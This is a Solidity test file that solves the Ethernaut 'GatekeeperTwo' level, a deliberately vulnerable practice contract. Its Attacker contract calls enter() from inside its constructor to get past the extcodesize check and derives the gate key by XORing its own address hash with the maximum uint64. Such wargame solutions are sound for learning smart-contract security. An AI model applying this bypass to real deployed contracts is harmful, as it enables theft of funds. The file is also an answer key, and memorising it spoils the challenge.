// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/14_GatekeeperTwo.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_14_GATEKEEPERTWO_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public {
        GatekeeperTwo keeper = GatekeeperTwo(levelInstance);
        
        new Attacker(address(keeper));

        assert(ILevel(levelFactory).validateInstance(levelInstance, tx.origin));
    }
}

contract Attacker {
    constructor(address keeperIml) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max); 
        bool result = GatekeeperTwo(keeperIml).enter(gateKey);
        assert(result);
    }
}
